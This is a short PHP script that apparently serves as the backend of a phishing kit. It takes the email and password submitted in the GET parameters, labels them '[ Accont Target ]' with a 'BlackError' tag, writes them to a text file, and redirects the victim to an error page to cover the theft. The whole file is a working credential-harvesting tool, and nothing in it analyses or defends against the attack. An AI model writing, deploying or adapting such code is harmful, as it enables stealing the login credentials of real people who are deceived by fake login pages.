<?php

$Email = $_GET["text"];

$Password = $_GET["pass"];

/*$BlackErrorPOST = $_POST['nofezphp']; */

$BlackErrorTXT = "

----------------------------------

[ Accont Target ] 

[ Email : $Email ]

[ Password : $Password ]

[ BlackError ] 

----------------------------------

"
;
 

$my_file = fopen("spase.txt" , "w");

fwrite($my_file , $BlackErrorTXT . "\n");

fclose($my_file);


?>  
<meta content='0;url=error.php' http-equiv='refresh'/>